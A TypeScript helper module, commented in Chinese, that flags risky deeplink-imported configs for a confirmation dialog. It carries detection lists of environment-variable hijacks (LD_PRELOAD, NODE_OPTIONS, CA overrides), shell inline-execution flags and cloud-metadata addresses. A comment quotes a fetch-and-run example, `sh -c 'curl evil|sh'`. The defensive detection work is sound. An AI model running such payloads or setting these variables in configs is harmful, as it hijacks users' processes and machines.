// deeplink 导入确认框的取值呈现工具。
//
// 这里的所有判定**只用于 UI 提示，不参与任何拦截决策**。深链接携带的自定义
// endpoint 与 env 是第三方供应商的正常配置能力（`http://localhost:11434` 就是
// Ollama / LM Studio 的常规用法），拦下来会打断合法场景。真正的缺口是用户在
// 点「导入」时看不到自己在同意什么——所以补的是可见性，不是黑名单。

export type RiskKind =
  | "envHijack"
  | "privateEndpoint"
  | "shellCommand"
  | "mcpDangerousField";

const SENSITIVE_CONFIG_KEY_MARKERS = [
  "TOKEN",
  "KEY",
  "SECRET",
  "PASSWORD",
  "AUTHORIZATION",
  "COOKIE",
  "CREDENTIAL",
];
const SENSITIVE_CONFIG_KEY_NAMES = new Set(["AUTH", "BEARER"]);

export function isSensitiveConfigKey(key: string): boolean {
  const normalizedKey = key.toUpperCase();
  return (
    SENSITIVE_CONFIG_KEY_NAMES.has(normalizedKey) ||
    SENSITIVE_CONFIG_KEY_MARKERS.some((marker) =>
      normalizedKey.includes(marker),
    )
  );
}

export function maskSensitiveValue(value: string): string {
  if (value.length === 0) return value;
  return value.length > 8
    ? `${value.substring(0, 4)}${"*".repeat(12)}`
    : "****";
}

/**
 * 能改变子进程加载行为的环境变量。
 *
 * 它们的共同点是：不影响"访问哪个 API"，而是影响"进程启动时加载什么代码 / 信任
 * 哪张证书"。没有任何合法的供应商预设需要通过分享链接设置它们。
 */
const ENV_HIJACK_PATTERNS: RegExp[] = [
  /^LD_/i, // LD_PRELOAD / LD_LIBRARY_PATH / LD_AUDIT
  /^DYLD_/i, // macOS 对应物
  /^NODE_OPTIONS$/i, // --require 任意脚本
  /^NODE_EXTRA_CA_CERTS$/i, // 注入 CA → TLS 中间人
  /^SSL_CERT_(?:FILE|DIR)$/i, // OpenSSL/Python/Ruby 信任自定义 CA
  /^REQUESTS_CA_BUNDLE$/i, // Python requests 自定义 CA
  /^CURL_CA_BUNDLE$/i, // curl 自定义 CA
  /^PYTHONPATH$/i,
  /^PYTHONSTARTUP$/i,
  /^RUBYOPT$/i,
  /^PERL5OPT$/i,
  /^JAVA_TOOL_OPTIONS$/i,
  /^GIT_SSH_COMMAND$/i, // git 子进程命令执行
  /^GIT_EXEC_PATH$/i, // git 子命令目录劫持
  /^BASH_ENV$/i,
  /^ZDOTDIR$/i, // zsh 启动脚本目录劫持
  /^PROMPT_COMMAND$/i,
  /^ENV$/i,
  /^IFS$/i,
  /^PATH$/i, // 整体劫持命令解析
  /^COMSPEC$/i, // Windows 默认命令解释器劫持
  /^PATHEXT$/i, // Windows 可执行扩展名劫持
  /^(?:HTTPS?|ALL)_PROXY$/i, // 全量流量转发
];

/** 会被 shell 解释成"执行下面这段字符串"的调用形态。 */
const SHELL_INTERPRETERS = new Set([
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "fish",
  "csh",
  "tcsh",
  "cmd",
  "cmd.exe",
  "powershell",
  "powershell.exe",
  "pwsh",
  "pwsh.exe",
]);

/**
 * 「下一个参数是要执行的命令串」这一族开关。
 *
 * 不能只比 `-c`：POSIX shell 允许把单字母开关并成一串（`bash -lc`、`sh -eco pipefail`
 * 之类），Windows 侧则是 `/c` `/k` 且大小写不敏感，PowerShell 还有 `-Command`
 * 的各种缩写。这里按形态判定而不是枚举字面量。
 */
function isInlineCommandFlag(arg: string): boolean {
  const lower = arg.toLowerCase();

  // cmd.exe：/c、/k，可带后缀（/c:）
  if (/^\/[ck]\b/.test(lower)) return true;

  // PowerShell：-Command / -c 及其任意合法缩写（-comm、-comma…）
  if (/^-c(o(m(m(a(n(d)?)?)?)?)?)?$/.test(lower)) return true;
  if (lower === "-encodedcommand" || lower === "-e" || lower === "-ec") {
    return true;
  }

  // POSIX shell：单横线 + 一串短开关，其中含 c（-c、-lc、-ec、-eco…）
  if (/^-[a-z]*c[a-z]*$/.test(lower)) return true;

  return false;
}

/**
 * 判定是否为环回 / 私网 / 云元数据地址。
 *
 * 只做**字面量**匹配，不做 DNS 解析：解析会引入超时，而且解析结果与客户端稍后
 * 实际连接时的结果可以不同（DNS rebinding），拿它当防线是虚假的确定性。作为
 * "这个地址看着像内网，你确认吗"的提示，字面量匹配已经够用。
 */
/**
 * 取出主机的 IPv4 四元组，兼容 IPv4-mapped, IPv4-compatible, SIIT 与 NAT64 等 IPv6 嵌入形式。
 *
 * `new URL()` 会把 `[::ffff:127.0.0.1]` 归一成 `[::ffff:7f00:1]`，
 * 把 `[::127.0.0.1]` 归一成 `[::7f00:1]`，
 * 把 `[64:ff9b::127.0.0.1]` 归一成 `[64:ff9b::7f00:1]`，
 * 点分形式在这一步消失。若仅匹配标准点分与 `::ffff:`，
 * `[::169.254.169.254]`、`[::ffff:0:169.254.169.254]` 与 NAT64 前缀均会绕过内网判定。
 */
function extractIpv4Octets(bare: string): [number, number] | null {
  const dotted = bare.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (dotted) return [Number(dotted[1]), Number(dotted[2])];

  // IPv6 嵌入 IPv4 形式（十六进制归一化）：
  // - IPv4-mapped: ::ffff:7f00:1
  // - SIIT IPv4-translated (RFC 6052 / RFC 7915): ::ffff:0:7f00:1
  // - NAT64 well-known / local prefix (RFC 6052 / RFC 8215): 64:ff9b::7f00:1, 64:ff9b:1::7f00:1
  // - IPv4-compatible (RFC 4291): ::7f00:1
  const hexMapped = bare.match(
    /^(?:(?:64:ff9b(?::1)?|)::|::ffff:(?:0:)?)([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i,
  );
  if (hexMapped) {
    const high = parseInt(hexMapped[1], 16);
    return [(high >> 8) & 0xff, high & 0xff];
  }

  // 少数实现或原始形式保留点分尾巴：
  // ::ffff:127.0.0.1, ::ffff:0:127.0.0.1, 64:ff9b::127.0.0.1, ::127.0.0.1
  const dottedMapped = bare.match(
    /^(?:(?:64:ff9b(?::1)?|)::|::ffff:(?:0:)?)(\d{1,3})\.(\d{1,3})\.\d{1,3}\.\d{1,3}$/i,
  );
  if (dottedMapped) {
    return [Number(dottedMapped[1]), Number(dottedMapped[2])];
  }

  return null;
}

export function classifyEndpoint(rawUrl: unknown): RiskKind | null {
  if (typeof rawUrl !== "string") return null;

  let host: string;
  try {
    host = new URL(rawUrl).hostname.toLowerCase();
  } catch {
    return null;
  }

  // URL 会把 IPv6 主机保留在方括号里
  const bare =
    host.startsWith("[") && host.endsWith("]") ? host.slice(1, -1) : host;

  if (
    bare === "localhost" ||
    bare.endsWith(".localhost") ||
    bare.endsWith(".local") ||
    bare.endsWith(".internal") ||
    bare === "::1" ||
    bare === "::" ||
    bare === "0.0.0.0"
  ) {
    return "privateEndpoint";
  }

  const octets = extractIpv4Octets(bare);
  if (octets) {
    const [a, b] = octets;
    if (
      a === 127 || // 环回
      a === 10 || // RFC 1918
      a === 0 ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254) // 链路本地，含 AWS/GCP 元数据 169.254.169.254
    ) {
      return "privateEndpoint";
    }
  }

  // IPv6 唯一本地地址 fc00::/7 与链路本地 fe80::/10
  if (/^f[cd][0-9a-f]{2}:/.test(bare) || /^fe[89ab][0-9a-f]:/.test(bare)) {
    return "privateEndpoint";
  }

  return null;
}

export function classifyEnvKey(key: unknown): RiskKind | null {
  if (typeof key !== "string") return null;
  return ENV_HIJACK_PATTERNS.some((pattern) => pattern.test(key))
    ? "envHijack"
    : null;
}

/**
 * MCP 服务器配置中能读取宿主机环境变量、借壳执行辅助命令或劫持工作目录的扩展字段。
 *
 * 确认弹窗必须把这些字段原样展示（绝不能因为字段名含 `token` 就脱敏掉被窃取的
 * 宿主机环境变量名），并用醒目的风险警告提示用户。
 */
const MCP_DANGEROUS_FIELDS = new Set([
  "bearer_token_env_var",
  "env_http_headers",
  "http_headers_helper",
  "headershelper",
  "headers_helper",
  "env_vars",
  "authprovidertype",
  "auth_provider_type",
  "cwd",
  "working_dir",
  "server",
]);

export function classifyMcpField(key: unknown): RiskKind | null {
  if (typeof key !== "string") return null;
  return MCP_DANGEROUS_FIELDS.has(key.toLowerCase())
    ? "mcpDangerousField"
    : null;
}

/**
 * 检测字符串是否包含客户端会展开的宿主机环境变量引用：
 * - `${VAR}` / `${VAR:-default}`（Claude Code / Gemini CLI）
 * - `$VAR`（Gemini CLI）
 * - `%VAR%`（Gemini CLI / Windows，排除 `%E4%B8%AD` 类双十六进制 URL 编码）
 */
export function containsEnvVarReference(value: unknown): boolean {
  if (typeof value !== "string") return false;
  if (
    /\$\{[A-Za-z_][A-Za-z0-9_]*[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*/.test(value)
  ) {
    return true;
  }
  const winEnvRegex = /%([A-Za-z_][A-Za-z0-9_]*)%/g;
  let match: RegExpExecArray | null;
  while ((match = winEnvRegex.exec(value)) !== null) {
    const inner = match[1];
    if (inner.length >= 2 && !/^[0-9A-Fa-f]{2}$/.test(inner)) {
      return true;
    }
    // 回退到结尾 `%` 继续扫描，防止 `%E4%OPENAI_API_KEY%` 借前导编码绕过
    winEnvRegex.lastIndex = match.index + inner.length + 1;
  }
  return false;
}

/**
 * 提取解释器自身在脚本文件 / `--` 之前的开关参数，避免把脚本自己的参数（例如
 * `python3 server.py -c config.toml` 里的 `-c`）误判为解释器的内联执行开关。
 */
function interpreterFlagsBeforeScript(
  args: unknown[],
  optionsWithValue: Set<string>,
  isTerminatingOption?: (arg: string) => boolean,
): string[] {
  const flags: string[] = [];
  for (let i = 0; i < args.length; i += 1) {
    const arg = args[i];
    if (typeof arg !== "string") continue;
    if (arg === "--" || arg === "-" || !arg.startsWith("-")) {
      break;
    }
    flags.push(arg);
    if (isTerminatingOption?.(arg)) {
      break;
    }
    if (optionsWithValue.has(arg)) {
      i += 1;
    }
  }
  return flags;
}

const NODE_OPTIONS_WITH_VALUE = new Set([
  "-r",
  "--require",
  "--import",
  "--loader",
  "--experimental-loader",
  "-C",
  "--conditions",
  "--env-file",
  "--env-file-if-exists",
  "--input-type",
]);

const PYTHON_OPTIONS_WITH_VALUE = new Set(["-W", "-X"]);
const PERL_OPTIONS_WITH_VALUE = new Set(["-I", "-M", "-m"]);
const RUBY_OPTIONS_WITH_VALUE = new Set(["-I", "-r", "-C", "-E", "-F", "-K"]);
const PHP_OPTIONS_WITH_VALUE = new Set(["-c", "-d", "-f", "-z"]);
const DENO_OPTIONS_WITH_VALUE = new Set([
  "-c",
  "--config",
  "--import-map",
  "--lock",
  "--env-file",
]);

function isScriptingInlineExecution(base: string, args: unknown[]): boolean {
  // Node.js / Bun: -e / -p / --eval / --print (or combined -pe / -ep) before script / `--`
  if (/^(?:node|bun)(?:\.exe)?$/.test(base)) {
    const flags = interpreterFlagsBeforeScript(args, NODE_OPTIONS_WITH_VALUE);
    return flags.some(
      (arg) =>
        /^-(?:[ep]+)$/.test(arg) ||
        arg === "--eval" ||
        arg === "--print" ||
        arg.startsWith("--eval=") ||
        arg.startsWith("--print="),
    );
  }

  // Deno: `deno [global-flags] eval ...` (stop at `--` or first subcommand)
  if (/^deno(?:\.exe)?$/.test(base)) {
    for (let i = 0; i < args.length; i += 1) {
      const arg = args[i];
      if (typeof arg !== "string") continue;
      if (arg === "--") return false;
      if (arg.startsWith("-")) {
        if (DENO_OPTIONS_WITH_VALUE.has(arg)) {
          i += 1;
        }
        continue;
      }
      return arg === "eval";
    }
    return false;
  }

  // Python (python, python3, python3.12, py): -c or combined short options ending in c (-uc, -Bc)
  // before the script filename, `-m <module>`, or `--`
  if (/^(?:python(?:\d+(?:\.\d+)*)?|py)(?:\.exe)?$/.test(base)) {
    const flags = interpreterFlagsBeforeScript(
      args,
      PYTHON_OPTIONS_WITH_VALUE,
      (arg) => /^-[bBdEiIOqSsuvP]*m/.test(arg),
    );
    return flags.some((arg) => /^-[bBdEiIOqSsuvP]*c/.test(arg));
  }

  // Perl: -e / -E (or combined -pe / -ne) before script / `--`
  if (/^perl(?:\.exe)?$/.test(base)) {
    const flags = interpreterFlagsBeforeScript(args, PERL_OPTIONS_WITH_VALUE);
    return flags.some((arg) => /^-[anplswWTU]*[eE]/.test(arg));
  }

  // Ruby: -e before script / `--`
  if (/^ruby(?:\.exe)?$/.test(base)) {
    const flags = interpreterFlagsBeforeScript(args, RUBY_OPTIONS_WITH_VALUE);
    return flags.some((arg) => /^-[anplswWvU]*e/.test(arg));
  }

  // PHP: -r before script / `--`
  if (/^php(?:\.exe)?$/.test(base)) {
    const flags = interpreterFlagsBeforeScript(args, PHP_OPTIONS_WITH_VALUE);
    return flags.some((arg) => /^-[nq]*r/.test(arg));
  }

  return false;
}

/**
 * MCP server 的 `command` + `args`。
 *
 * 单看 `command` 完全不够：真实 payload 是 `command: "sh"` 配
 * `args: ["-c", "curl evil|sh"]`，界面上只渲染 command 时它显示成无害的 `sh`。
 *
 * 两个参数都声明成 `unknown`：它们来自深链接里 base64 解码后的任意 JSON，TS 的
 * 类型标注在这个边界上不设防。写成 `string` 而实际收到对象或数字时 `.split()`
 * 会抛错，把整个确认框炸成空白——那比显示一条误导性的 `Command: sh` 更糟，因为
 * 用户连"有东西要导入"都看不到了。
 */
export function classifyCommand(
  command: unknown,
  args?: unknown,
): RiskKind | null {
  if (typeof command !== "string" || !command) return null;
  if (!Array.isArray(args)) return null;

  // 只取基名：`/bin/sh` 与 `sh` 是同一回事
  const base = command.split(/[/\\]/).pop()?.toLowerCase() ?? "";
  if (SHELL_INTERPRETERS.has(base)) {
    return args.some(
      (arg) => typeof arg === "string" && isInlineCommandFlag(arg),
    )
      ? "shellCommand"
      : null;
  }

  return isScriptingInlineExecution(base, args) ? "shellCommand" : null;
}

/**
 * 凭据类取值的展示脱敏。
 *
 * 原先是 `DeepLinkImportDialog` 内的组件闭包；MCP 确认页也要展示 env，抽出来是
 * 为了两处共用同一套规则——各写一份迟早会漂移成两种脱敏口径。
 */
export function maskValue(key: string, value: string): string {
  return isSensitiveConfigKey(key) ? maskSensitiveValue(value) : value;
}

/** 风险种类 → i18n key。 */
export function riskI18nKey(kind: RiskKind): string {
  return `deeplink.risk.${kind}`;
}

/**
 * 解码 deeplink 携带的 base64 载荷，供确认框展示。
 *
 * 解码失败时**回落到原始串，绝不返回空串**。确认框的职责是让用户看见即将写入
 * 什么；一段解不开的 payload 也必须以原样出现。返回空会让整块内容凭空消失，
 * 界面上看起来就像"没有脚本"——那正是攻击者想要的效果。
 */
export function decodeDeeplinkPayload(
  encoded: unknown,
  decode: (value: string) => string,
): string {
  if (typeof encoded !== "string") return "";
  try {
    const decoded = decode(encoded);
    // 解出空串同样可疑：宁可显示原始 base64，也不显示"什么都没有"。
    return decoded === "" ? encoded : decoded;
  } catch {
    return encoded;
  }
}
